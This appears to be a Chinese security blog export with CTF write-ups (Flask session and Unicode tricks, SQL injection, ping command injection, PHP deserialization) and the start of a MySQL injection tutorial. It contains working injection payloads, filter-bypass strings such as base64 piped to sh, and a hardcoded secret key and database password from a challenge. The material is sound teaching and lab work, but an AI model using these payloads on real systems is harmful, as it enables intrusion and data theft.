['GET', 'POST'])def register(): if current_user.is_authenticated: return redirect(url_for('index')) form = RegisterForm() if request.method == 'POST': name = strlower(form.username.data) if session.get('image').lower() != form.verify_code.data.lower(): flash('Wrong verify code.') return render_template('register.html', title = 'register', form=form) if User.query.filter_by(username = name).first(): flash('The username has been registered') return redirect(url_for('register')) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash('register successful') return redirect(url_for('login')) return render_template('register.html', title = 'register', form = form)@app.route('/login', methods = ['GET', 'POST'])def login(): if current_user.is_authenticated: return redirect(url_for('index')) form = LoginForm() if request.method == 'POST': name = strlower(form.username.data) session['name'] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash('Invalid username or password') return redirect(url_for('login')) login_user(user, remember=form.remember_me.data) return redirect(url_for('index')) return render_template('login.html', title = 'login', form = form)@app.route('/logout')def logout(): logout_user() return redirect('/index')@app.route('/change', methods = ['GET', 'POST'])def change(): if not current_user.is_authenticated: return redirect(url_for('login')) form = NewpasswordForm() if request.method == 'POST': name = strlower(session['name']) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash('change successful') return redirect(url_for('index')) return render_template('change.html', title = 'change', form = form)@app.route('/edit', methods = ['GET', 'POST'])def edit(): if request.method == 'POST': flash('post successful') return redirect(url_for('index')) return render_template('edit.html', title = 'edit')@app.errorhandler(404)def page_not_found(error): title = unicode(error) message = error.description return render_template('errors.html', title=title, message=message)def strlower(username): username = nodeprep.prepare(username) return username 解法一：条件竞争[未复现成功]此解法感觉是错误的，不过看飘零师傅的WP有详细描述，我这边复现没成功，若有了解的师傅欢迎找我讨论 :) 我们注意到，登录函数的写法有点奇怪。通常来说，SESSION存取登录成功的用户信息是在验证通过提交的账号与密码之后的事情，但这里的代码确实先将用户名存入SESSION中，不符合常理，可能存在绕过的可能。 12345678910111213141516def login(): if current_user.is_authenticated: return redirect(url_for('index')) form = LoginForm() if request.method == 'POST': name = strlower(form.username.data) # 通常验证通过再存入SESSION session['name'] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash('Invalid username or password') return redirect(url_for('login')) login_user(user, remember=form.remember_me.data) return redirect(url_for('index')) return render_template('login.html', title = 'login', form = form) 同时，对于修改密码函数来说： 123456789101112def change(): if not current_user.is_authenticated: return redirect(url_for('login')) form = NewpasswordForm() if request.method == 'POST': name = strlower(session['name']) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash('change successful') return redirect(url_for('index')) return render_template('change.html', title = 'change', form = form) 是从SESSION中获取用户名的。 这样的话就存在一种可能，就是当我们change函数执行到name = strlower(session['name'])之前，我们已退出当前用户，并以错误的密码尝试登录admin用户，此时session['name']的值为admin，change函数便将admin账户的密码给成功修改了。 贴一下利用脚本，由syang@Whitzard编写： 1234567891011121314151617181920212223242526272829303132333435363738394041import requestsimport threadingdef login(s, username, password): data = { 'username': username, 'password': password, 'submit': '' } return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)def logout(s): return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)def change(s, newpassword): data = { 'newpassword':newpassword } return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)def func1(s): login(s, 'skysec', 'skysec') change(s, 'skysec')def func2(s): logout(s) res = login(s, 'admin', 'skysec') if '&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;' in res.text: print('finish')def main(): for i in range(1000): print(i) s = requests.Session() t1 = threading.Thread(target=func1, args=(s,)) t2 = threading.Thread(target=func2, args=(s,)) t1.start() t2.start()if __name__ == &quot;__main__&quot;: main() 说明一下，此方法由我多次测试均不能修改admin的密码。我认为由于flask客户端session的特训，及时在change函数获取session['name']之前通过login函数修改了session['name']的值，但是change函数取到的值仍不会受到影响。flask的session存在客户端的Cookie之中，视图函数获取session相当于去解析其对应的请求体中的Cookie字段，而不是存在服务器端的session文件中，故在整个change函数里，session的值都不会改变，并不含产生竞争。 解法二：Unicode欺骗我们注意到，在代码里，此处用到的一个自己定义的字符转小写函数。 12345from twisted.words.protocols.jabber.xmpp_stringprep import nodeprepdef strlower(username): username = nodeprep.prepare(username) return username 我们再去requirements.txt看一下这个库的版本是多少： 1Twisted==10.2.0 而我们去官方的仓库：https://github.com/twisted/twisted/releases可以发现，在当时（18年）Twisted最新的版本为18.7.0。 这两个版本差别也太大了，而且专门导入一个库来进行字符转换感觉也很有问题。 一番查询后可以找到：https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e 文中指出，在低版本的Twisted库中nodeprep.prepare会对特殊字符ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ(small caps)进行如下操作： 1ᴀ-&gt;A-&gt;a 可以发现ᴀ并不是被转成a而是大写的A，那么我们注意到，login在取参时会进行一次strlower转换且change又再一次进行strlower转换。 如此一来我们可以这样操作： 1注册ᴀdmin用户(实际注册的用户是Admin)并登陆-&gt;以ᴀdmin用户名登陆-&gt;session存的用户名是Admin-&gt;更改密码时获取到的name为admin-&gt;成功修改admin的密码 解法三：Session伪造参考p牛文章：https://www.leavesongs.com/PENETRATION/client-session-security.html 由于flask客户端session的特性，且session存储方式类似JWT，仅仅只在末尾拼接了相应的hash作数据校验，故session的内容对于我们来说是可视的。 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload)if __name__ == '__main__': print(decryption(sys.argv[1].encode())) 又因为我们在config.py文件中可以发现： 1234class Config(object): SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123' SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test' SQLALCHEMY_TRACK_MODIFICATIONS = True SECRET_KEY可能为ckj123，如此一来我们便可以生成相应的hash拼接上我们的伪造的数据达到伪造session的作用。 利用脚本：https://github.com/noraj/flask-session-cookie-manager [极客大挑战 2019]LoveSQL打开题目，看样子应该是前面那道简单题的简单升级版。 随便输入一些数据，跳转到：/check.php?username=1&amp;password=1。 老样子，在username与password分别单独加单引号，发现均返回错误。说明应该是之前讲的第一种判断逻辑。 老EXP尝试：username=1'%20or1%3d1%23&amp;password=1，成功登录，返回了管理员密码的密文值，看长度应该是MD5。 12345Login Success!Hello admin！Your password is '5712153fef7655da3f5bf3af7ddf464b' 但尝试MD5解密失败，结果发现居然是明文，不过改换admin登录也没啥用，结合题目意思应该需要我们进行跨表注入。 联合注入经典步骤： 判断字段数1/check.php?username=1'%20or1%3d1order%20by%20{字段数}%23&amp;password=1 当尝试字段数为4时，返回报错信息： 1Unknown column '4' in 'order clause' 尝试3时返回正常，说明union前边的语句获取的字段数为3。 查看回显位置1check.php?username=1%27union%20select%201,2,3%23&amp;password=1 回显数据： 123Hello 2！Your password is '3' 我们选择在2字段处继续回显数据（任意选择） 爆库名11' union select 1,database(),3 # 爆表名11' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() # 爆列名11' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name = 'l0ve1ysq1' # 取数据11' union select 1,group_concat(username,password),3 from l0ve1ysq1 # 成功获得flag。 [GXYCTF2019]Ping Ping Ping经典命令执行题了，这里简单总结一下。 ${IFS}、$IFS$任意数字，可充当空格。 &lt;、&gt;可取代空格，如cat&lt;flag.php。 fla\\g.php、fl*g.php、fla?.php、fl'a'g.php均可被认作flag.php。 {OS_COMMAND,ARGUMENT}，如：{cat,/etc/passwd}。 ;a=g;cat fla$a.php;，临时变量可做字符串拼接。 cat fla${n}g.php，n变量并未赋值，空变量拼接绕过空格。 通配符：[a-z]、[abc]、{a,b,c}类似*、?的功能，fl[a-z]g.php可取到flag.php。 编码转换：echo 'Y2F0IGEudHh0Cg=='|base64 |(ba)sh、echo &quot;63617420612e7478740a&quot;|xxd -r -p|sh tac命令相当于cat的镜像命令，取到的内容是倒序的，从最后一行取到第一行；rev命令是cat完全相反，从最后一个字符倒序取值。 分隔符： 1.&amp;，&amp; 表示将任务置于后台执行。2.&amp;&amp;，只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。3.|，| 表示管道，上一条命令的输出，作为下一条命令的参数4.||，只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。5.;，多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块引自：https://blog.csdn.net/qq_42812036/java/article/details/104297163 回到题目本身： 先列下目录：?ip=1;ls 123PING 1 (0.0.0.1): 56 data bytesflag.phpindex.php 直接读取flag.php失败：1;cat%20flag.php 1fxck your space! # 拦截了空格 使用$IFS尝试代替绕过：?ip=1;cat$IFS$1flag.php 1fxck your flag! 转去读index.php文件查看源代码再做打算：?ip=1;cat$IFS$1index.php，得源码： 12345678910111213141516171819&lt;?phpif(isset($_GET['ip'])){ $ip = $_GET['ip']; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{1f}]|\\&gt;|\\'|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/&quot;, $ip, $match)){ echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{20}]|\\&gt;|\\'|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); } else if(preg_match(&quot;/ /&quot;, $ip)){ die(&quot;fxck your space!&quot;); } else if(preg_match(&quot;/bash/&quot;, $ip)){ die(&quot;fxck your bash!&quot;); } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){ die(&quot;fxck your flag!&quot;); } $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);}?&gt; 过滤了很多符号，空格，bash关键字(改用sh执行)，.*f.*l.*a.*g.*贪婪模式判断f|l|a|g的顺序不能出现。 这里我们使用$IFS$数字代替空格，而.*f.*l.*a.*g.*的绕过有下边三种方法。 变量拼接法1?ip=1;u=g;cat$IFS$1fla$u.php 编码转换法1?ip=1;echo$IFS$1Y2F0IGZsYWcucGhwCg==|base64$IFS$1-d|sh 反引做参法1?ip=1;cat$IFS$1`ls` #打开工作目录的全部文件并返回内容 [极客大挑战 2019]PHP打开题目，无提醒，考点模糊的情况下：先查看响应头与HTML源代码，还是无头绪再进行文件扫描。 这里使用dirsearch扫描到有www.zip，访问之将源码down下来，这里贴个关键代码： 12345678910111213141516171819202122232425262728293031323334353637383940#class.php&lt;?phpinclude 'flag.php';error_reporting(0);class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!&quot;; die(); } }}?&gt; 123456#index.php&lt;?php include 'class.php'; $select = $_GET['select']; $res=unserialize(@$select);?&gt; 本地打开phpstudy开个简单的服务器，复制class.php文件并添加如下代码： 12$a = new Name('admin',100);echo urlencode(serialize($a)); 访问得到实例$a的序列化值(URL编码)： 1O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D 解码之后（不可见字符不处理）是这样子的： 1O:4:&quot;Name&quot;:2:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;} 此处用到一个漏洞(CVE-2016-7124，影响版本PHP5&lt;5.6.25，PHP7&lt;7.0.10)，当反序列化字符串中声明的属性个数大于实际提供的属性时，__wakeup函数并不会执行。 简单地说明这个漏洞就是，PHP底层在编写反序列代码时，将__wakeup函数的调用放在解析字符串功能之后，而如果解析字符串出现错误时就会直接return 0;，从而其后边的__wakeup魔法函数便调用不上。至于为何是修改变量个数，是因为若修改如变量名长度，会导致解析字符串的关键函数pap_var_unserialize出错，并将释放当前key(变量)空间，导致类中的变量赋值失败。而如果只是修改变量个数的话，便可以使得不出现上述错误而导致赋值失败，也可以让解析字符串功能出错返回0。 故EXP： 1/?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;} 后记好久没刷题了，真的生疏了很多。不仅很多很简单的点到不太记得了，甚至连简单的SQL题做的时候都愣了好一会儿，有点“无从下手”的感觉，看来平时还是得多话时间来刷刷题，而且从这次的刷题中，能明显看出自己对于许多考点都不熟悉，唉，还是太菜了。 参考 BUUCTF[强网杯 2019]随便注 的三种解法 [SUCTF 2019]EasySQL 2018 HCTF Web Writeup [GXYCTF2019]Ping Ping Ping {命令执行总结} PHP 内核层解析反序列化漏洞","link":"/2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)%E4%B9%8BBUUCTF/"},{"title":"对MYSQL注入相关内容及部分Trick的归类小结","text":"本文首发于：https://xz.aliyun.com/t/7169 前言最近在给学校的社团成员进行web安全方面的培训，由于在mysql注入这一块知识点挺杂的，入门容易，精通较难，网上相对比较全的资料也比较少，大多都是一个比较散的知识点，所以我打算将我在学习过程中遇到的关于的mysql注入的内容给全部罗列出来，既方便个人之后的复习，也方便后人查找相关资料。 本文部分内容可能会直接截取其他大牛的文章，截取的内容我都会进行声明处理。如有侵权，请发email联系我(asp-php#foxmail.com)删除。 Mysql简介在正式讲解mysql注入的内容前，我认为还是有必要说明一下什么是mysql、mysql的特点是什么等内容，这些东西看起来可能对注入毫无帮助，开始却能很好的帮助我们学习，融会贯通。 MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。 MySQL是开源的，所以你不需要支付额外的费用。 MySQL使用标准的 SQL 数据语言形式。 MySQL可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。 MySQL对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。 MySQL支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。 MySQL是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。 引自：Mysql教程 | 菜鸟教程 一个完整的mysql管理系统结构通常如下图： 可以看到，mysql可以管理多个数据库，一个数据库可以包含多个数据表，而一个数据表有含有多条字段，一行数据正是多个字段同一行的一串数据。 什么是SQL注入？简单的来说，SQL注入是开发者没有对用户的输入数据进行严格的限制/转义，致使用户在输入一些特定的字符时，在与后端设定的sql语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信。 举个例子： 123456789101112131415&lt;?php$conn = mysqli_connect($servername, $username, $password, $dbname);if (!$conn) { die(&quot;Connection failed: &quot; . mysqli_connect_error());}$username = @$_POST['username'];$password = @$_POST['password'];$sql = &quot;select * from users where username = '$username' and password='$password';&quot;;$rs = mysqli_query($conn,$sql);if($rs-&gt;fetch_row()){ echo &quot;success&quot;;}else{ echo &quot;fail&quot;;}?&gt; 上述代码将模拟一个web应用程序进行登录操作。若登录成功，则返回success，否则，返回fail。 通常正常用户进行登录的sql语句为： 1select * from users where username = '$username' and password='$password' 其中，变量$username 与变量$password为用户可以控制的内容，正常情况下，用户所输入的内容在sql语义上都将作为字符错，被赋值给前边的字段来当做整条select查询语句的筛选条件。 若用户输入的$username为admin'#，$password为123。那么拼接到sql语句中将得到如下结果： 1select * from users where username = 'admin'#' and password='123' 这里的#是单行注释符，可以将后边的内容给注释掉。那么此条语句的语义将发生了变化，用户可以不需要判断密码，只需一个用户名，即可完成登录操作，这与开发者的初衷相悖。 Mysql注入-入门我们知道，在数据库中，常见的对数据进行处理的操作有：增、删、查、改这四种。 每一项操作都具有不同的作用，共同构成了对数据的绝大部分操作。 增。顾名思义，也就是增加数据。在通用的SQL语句中，其简单结构通常可概述为: INSERT table_name(columns_name) VALUES(new_values)。 删。删除数据。简单结构为: DELETE table_name WHERE condition。 查。查询语句可以说是绝大部分应用程序最常用到的SQL语句，他的作用就是查找数据。其简单结构为：SELECT columns_name FROM table_name WHERE condition。 改。有修改/更新数据。简单结构为:UPDATE table_name SET column_name=new_value WHERE condition。 PS：以上SQL语句中，系统关键字全部进行了大写处理。 查mysql的查询语句完整格式如下： 1234567891011121314151617181920212223SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY {col_name | expr | position} [ASC | DESC], ...] [LIMIT {[offset,] row_count | row_count OFFSET offset}] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' [CHARACTER SET charset_name] export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 通常注入点发生在where_condition处，并不是说唯有此处可以注入，其他的位置也可以，只是我们先将此处的注入当做例子来进行讲解，之后会逐渐降到其他的位置该如何进行注入。 对于SELECT语句，我们通常分其为两种情况：有回显和无回显。 有回显什么叫有回显？别急，我们来举个例子。 当我们点击一篇文章阅读时，其URL为read.php?id=1，我们可以很容易地猜出其SQL语句可能为select * from articles where id='$id'。 这时候页面将SQL语句返回的内容显示在了页面中(本例中是标题、内容、作者等信息)，这种情况就叫有回显。 对于有回显的情况来说，我们通常使用联合查询注入法。 联合查询注入其作用就是，在原来查询条件的基础上，通过系统关键字union从而拼接上我们自己的select语句，后个select得到的结果将拼接到前个select的结果后边。如：前个select得到2条数据，后个select得到1条数据，那么后个select的数据将作为第3条拼接到第一个select返回的内容中，其字段名将按照位置关系进行继承。 如：正常查询语句 union select columns_name from (database.)table_name where condition 这里需要注意的是： 若回显仅支持一行数据的话，记得让前边正常的查询语句返回的结果为空。 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接。 无回显什么叫无回显？之前举得登录判断就是一个无回显的例子。如果SQL语句存在返回的数据，那么页面输出为success，若不存在返回的数据，则输出fail。 与有回显情况不同的是：无回显的页面输出内容并不是SQL语句返回的内容。 对于无回显的情况，我们通常可用两种方法进行注入：报错注入与盲注。 报错注入什么是报错注入，简单的说，就是有些特殊的函数，会在其报错信息里可能会返回其参数的值。 我们可以利用这一特性，在其参数放入我们想要得到的数据，通常使用子查询的方法实现，最后让其报错并输出结果。 123正常语句 (where | and) exp(~(select * from(select user())a));正常语句 (where | and) updatexml(1,concat(0x7e,(select user()),0x7e),1); 盲注若网站设置了无报错信息返回，那么在不直接返回数据+不返回报错信息的情况下，盲注便几乎成了最后一种直接注入取数据的方法了。 其中，盲注分成布尔盲注和时间盲注。 布尔盲注对于布尔盲注来说，其使用的场景在于：对真/假条件返回的内容很容易区分。 比如说，有这么一条正常的select语句，我们再起where条件后边加上and 1=2，我们知道，1永远不等于2，那么这个条件就是一个永假条件，我们使用and语句连上，那么整个where部分就是永假的，这时候select语句是不会返回内容的。将其返回的内容与正常页面进行对比，如果很容易区分的话，那么布尔盲注试用。 如：正常语句 (where | and) if(substr((select password from users where username='admin'),1,1)='a',1,0) 时间盲注相比较于布尔盲注，时间盲注依赖于通过页面返回的延迟时间来判断条件是否正确。 使用场景：布尔盲注永假条件所返回的内容与正常语句返回的内容很接近/相同，无法判断情况。 简单的来说，时间盲注就是，如果我们自定义的条件为假的话，我们让其0延迟通过，如果条件为真的话，使用sleep()等函数，让sql语句的返回产生延迟。 如：正常语句（where | and）if(substr((select password from users where username='admin'),1,1)='a',sleep(3),1) 最后总结一下: 常见注入方法有三种：联合查询注入、报错注入、盲注，其中： 有回显：三种均可使用，推荐使用联合查询注入。 无回显：报错注入+盲注可用。 对于时间成本来说：联合查询注入&lt;报错注入&lt;&lt;盲注。 通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。 三大注入的基本步骤联合查询注入步骤1) 首先，先确定字段数量。 使用order/group by语句。通过往后边拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于或等于，则页面正常。若错误页与正常页一样，更换报错注入/盲注。 2) 第二步，判断页面回显数据的字段位置。 使用union select 1,2,3,4,x... 我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可。 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一。 3) 第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。 首先，查询当前数据库名database()、数据库账号user()、数据库版本version()等基本情况，再根据不同的版本、不同的权限确定接下来的方法。 若Mysql版本&lt;5.0简单的说，由于mysql的低版本缺乏系统库information_schema，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠猜来解决。 直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。 若知道仅表名而不知道列(字段)名： 可通过以下payload： 若多字段：select `x` from(select 1,2,3,4,xxx from table_name union select * from table_name)a 若单字段：select *,1,2,xxx from table_name 若Mysql版本&gt;=5.0首先去一个名为information_schema的数据库里的shemata数据表查询全部数据库名。 若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。 在information_schema的一个名为tables的数据表中存着全部的数据表信息。 其中，table_name 字段保存其名称，table_schema保存其对应的数据库名。 1union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema=database(); 上述payload可查看全部的数据表名，其中group_concat函数将多行数据转成一行数据。 接着通过其表名，查询该表的所有字段名，有时也称列名。 通过information_schema库下的columns表可查询对应的数据库/数据库表含有的字段名。 1Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema=database() and table_name=(table_name)#此处的表名为字符串型，也通过十六进制表示 知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。 1Union select 1,2,column_name,4,xxx from (database_name.)table_name 简单的说，查库名-&gt;查表名-&gt;查字段名-&gt;查数据 盲注步骤：核心：利用逻辑代数连接词/条件函数，让页面返回的内容/响应时间与正常的页面不符。 布尔盲注：首先通过页面对于永真条件or 1=1与永假条件and 1=2的返回内容是否存在差异进行判断是否可以进行布尔盲注。 如：select * from users where username=$username，其作用设定为判断用户名是否存在。 通常仅返回存在/不存在，两个结果。 这时候我们就不能使用联合查询法注入，因为页面显示SQL语句返回的内容，只能使用盲注法/报错注入法来注出数据。 我们在将语句注入成：select * from users where username=$username or (condition) 若后边拼接的条件为真的话，那么整条语句的where区域将变成永真条件。 那么，即使我们在$username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。 利用这一特性，我们的condition为：length(database())&gt;8 即可用于判断数据库名长度 除此之外，还可：ascii(substr(database(),1,1))&lt;130 用二分法快速获取数据名(逐字判断) payload如下： 12select * from users where username=nouser or length(database())&gt;8select * from users where username=nouser or ascii(substr(database(),1,1))&lt;130 时间盲注：通过判断页面返回内容的响应时间差异进行条件判断。 通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。 如上述例子：若服务器在执行永真/永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。 在上述语句中，我们拼接语句，变成： 1select * from users where username=$username (and | or) if(length(database())&gt;8,sleep(3),1) 如果数据库名的长度大于8，那么if条件将执行sleep(3)，那么此条语句将进行延迟3秒的操作。 若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。 报错注入步骤：通过特殊函数的错误使用使其参数被页面输出。 前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。 常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等 如：select * from users where username=$username (and | or) updatexml(1,concat(0x7e,(select user()),0x7e),1) 因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符~，使其不满足xpath格式，进行报错并输出。 将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。 注意： 报错函数通常尤其最长报错输出的限制，面对这种情况，可以进行分割输出。 特殊函数的特殊参数进运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。 增、删、改可简单当做无回显的Select语句进行注入。值得注意的是，通常增insert处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。 Mysql注入-进阶到目前为止，我们讲了Mysql注入的基本入门，那么接下来我将会花费大部分时间介绍我学习mysql注入遇到的一些知识点。 常见防御手段绕过在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。 简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。 若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。 举个例子：程序过滤掉了union这一关键词，我们可以使用ununionion来绕过。 PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。 and/or 被过滤/拦截 双写anandd、oorr 使用运算符代替&amp;&amp;、|| 直接拼接=号，如：?id=1=(condition) 其他方法，如：?id=1^(condition) 空格被过滤/拦截 多层括号嵌套 改用+号 使用注释代替 and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略 %09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格 如：select * from user where username='admin'union(select+title,content/**/from/*!article*/where/**/id='1'and!!!!~~1=1) 括号被过滤/拦截 order by 大小比较盲注 逗号被过滤/拦截 改用盲注 使用join语句代替 substr(data from 1 for 1)相当于substr(data,1,1)、limit 9 offset 4相当于limt 9,4 其他系统关键字被过滤/拦截 双写绕过关键字过滤 使用同义函数/语句代替，如if函数可用case when condition then 1 else 0 end语句代替。 单双引号被过滤/拦截/转义 需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。 不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。 数字被过滤/拦截 下表摘自MySQL注入技巧 代替字符 数 代替字符 数、字 代替字符 数、字 false、!pi() 0 ceil(pi()*pi()) 10\\A ceil((pi()+pi())*pi()) 20\\K true、!(!pi()) 1 ceil(pi()*pi())+true 11\\B ceil(ceil(pi())*version()) 21\\L true+true 2 ceil(pi()+pi()+version()) 12\\C ceil(pi()*ceil(pi()+pi())) 22\\M floor(pi())、~~pi() 3 floor(pi()*pi()+pi()) 13\\D ceil((pi()+ceil(pi()))*pi()) 23\\N ceil(pi()) 4 ceil(pi()*pi()+pi()) 14\\E ceil(pi())*ceil(version()) 24\\O floor(version()) //注意版本 5 ceil(pi()*pi()+version()) 15\\F floor(pi()*(version()+pi())) 25\\P ceil(version()) 6 floor(pi()*version()) 16\\G floor(version()*version()) 26\\Q ceil(pi()+pi()) 7 ceil(pi()*version()) 17\\H ceil(version()*version()) 27\\R floor(version()+pi()) 8 ceil(pi()*version())+true 18\\I ceil(pi()pi()pi()-pi()) 28\\S floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19\\J floor(pi()pi()floor(pi())) 29\\T 编码转换产生的问题宽字节注入什么是宽字节注入？下面举个例子来告诉你。 1234567891011121314151617&lt;?php$conn = mysqli_connect(&quot;127.0.0.1:3307&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);if (!$conn) { die(&quot;Connection failed: &quot; . mysqli_connect_error());}$conn-&gt;query(&quot;set names 'gbk';&quot;);$username = addslashes(@$_POST['username']);$password = addslashes(@$_POST['password']);$sql = &quot;select * from users where username = '$username' and password='$password';&quot;;$rs = mysqli_query($conn,$sql);echo $sql.'&lt;br&gt;';if($rs-&gt;fetch_row()){ echo &quot;success&quot;;}else{ echo &quot;fail&quot;;}?&gt; 还是开头的例子，只不过加了点料。 123$conn-&gt;query(&quot;set names 'gbk';&quot;);$username = addslashes(@$_POST['username']);$password = addslashes(@$_POST['password']); addslashes函数将会把POST接收到的username与password的部分字符进行转义处理。如下： 字符'、&quot;、\\前边会被添加上一条反斜杠\\作为转义字符。 多个空格被过滤成一个空格。 这使得我们原本的payload被转义成如下： 1select * from users where username = 